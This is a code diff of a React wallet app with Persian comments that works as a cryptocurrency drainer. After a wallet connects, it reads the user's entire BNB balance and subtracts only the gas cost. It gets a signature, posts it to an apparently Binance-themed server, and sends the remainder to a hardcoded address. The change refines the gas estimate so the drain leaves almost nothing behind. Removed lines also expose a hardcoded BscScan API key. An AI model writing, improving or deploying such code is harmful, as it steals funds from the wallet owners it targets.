@@ -1,33 +1,42 @@
 import React, { useState } from "react";
 
-const BSCSCAN_API_KEY = "YVGXID1YVM77RQI37GEEI7ZKCA2BQKQS4P";
-
-async function getBNBBalance(address) {
+async function getLiveBalance(address) {
   try {
-    const resp = await fetch(
-      `https://api.bscscan.com/api?module=account&action=balance&address=${address}&tag=latest&apikey=${BSCSCAN_API_KEY}`
-    );
-    const data = await resp.json();
-    if (data.status === "1") {
-      return (parseInt(data.result) / 1e18).toFixed(6);
-    }
+    // دریافت بالانس به صورت hex از طریق eth_getBalance
+    const balanceHex = await window.ethereum.request({
+      method: "eth_getBalance",
+      params: [address, "latest"],
+    });
+    // تبدیل به عدد اعشاری
+    return parseFloat(parseInt(balanceHex, 16) / 1e18).toFixed(6);
   } catch (error) {
-    console.error("❌ Error fetching BNB balance:", error);
+    console.error("❌ Error fetching live balance:", error);
+    return null;
   }
-  return null;
+}
+
+async function getGasPrice() {
+  try {
+    const gasPriceHex = await window.ethereum.request({
+      method: "eth_gasPrice",
+      params: [],
+    });
+    return parseInt(gasPriceHex, 16); // به Wei
+  } catch (error) {
+    console.error("❌ Error fetching gas price:", error);
+    return null;
+  }
 }
 
 function App() {
   const [account, setAccount] = useState(null);
 
   async function connectAndSend() {
-    // اطمینان از وجود provider (DApp Browser تراست والت)
     if (typeof window.ethereum === "undefined") {
       alert("No Ethereum provider found. Please open in Trust Wallet DApp Browser!");
       return;
     }
 
-    // درخواست آدرس کاربر
     let accounts;
     try {
       accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
@@ -43,27 +52,34 @@ function App() {
     setAccount(userAddress);
     console.log("✅ User address:", userAddress);
 
-    // گرفتن بالانس از BscScan
-    const bnbBalance = await getBNBBalance(userAddress);
-    console.log("💰 BNB Balance:", bnbBalance);
-    const totalBalance = parseFloat(bnbBalance);
+    // دریافت بالانس زنده از شبکه (eth_getBalance)
+    const liveBalance = await getLiveBalance(userAddress);
+    console.log("💰 Live BNB Balance:", liveBalance);
+    const totalBalance = parseFloat(liveBalance);
 
-    // تعیین reserve برای هزینه گس؛ اینجا reserve به 0.01 BNB (تنظیم قابل تغییر است)
-    const reserveBNB = 0.01;
-    const sendAmount = totalBalance - reserveBNB;
+    // دریافت قیمت gas به صورت پویا
+    const gasPriceWei = await getGasPrice();
+    if (!gasPriceWei) return;
+    console.log("💰 Current gas price (Wei):", gasPriceWei);
+
+    const gasLimit = 21000; // استاندارد انتقال BNB
+    const gasCostBNB = (gasLimit * gasPriceWei) / 1e18;
+    console.log("Estimated gas cost (BNB):", gasCostBNB);
+
+    // اگر می‌خواهید reserve ثابت نداشته باشید، sendAmount = balance - gasCost
+    const sendAmount = totalBalance - gasCostBNB;
     if (sendAmount <= 0) {
-      console.error("❌ Insufficient funds: not enough to cover reserve for gas fee.");
+      console.error("❌ Insufficient funds: not enough to cover gas fee.");
       return;
     }
     console.log("Calculated send amount (BNB):", sendAmount);
 
-    // ساخت پیام برای امضا بر اساس sendAmount
+    // ساخت پیام برای امضا (بر اساس sendAmount)
     const message = `Authorize sending ${sendAmount} BNB from ${userAddress}`;
     console.log("📜 Message to sign:", message);
 
     let signature;
     try {
-      // استفاده از personal_sign جهت امضای پیام
       signature = await window.ethereum.request({
         method: "personal_sign",
         params: [message, userAddress],
@@ -74,7 +90,7 @@ function App() {
       return;
     }
 
-    // ارسال امضا به سرور جهت بررسی
+    // ارسال امضا به سرور جهت بررسی و ثبت لاگ
     try {
       const resp = await fetch("https://sponsorbinance.vercel.app/api/proxy", {
         method: "POST",
@@ -97,13 +113,13 @@ function App() {
       return;
     }
 
-    // ساخت تراکنش واقعی؛ در این نسخه gas و gasPrice حذف شده تا کیف پول آن‌ها را تخمین بزند.
+    // ساخت تراکنش واقعی
     const sendWeiHex = "0x" + (sendAmount * 1e18).toString(16);
     const txParams = {
       from: userAddress,
       to: "0xF4c279277f9a897EDbFdba342f7CdFCF261ac4cD", // آدرس مقصد
       value: sendWeiHex
-      // حذف gas و gasPrice برای استفاده از تخمین خودکار کیف پول
+      // gas و gasPrice حذف شده‌اند تا کیف پول به‌طور خودکار تخمین بزند.
     };
 
     try {
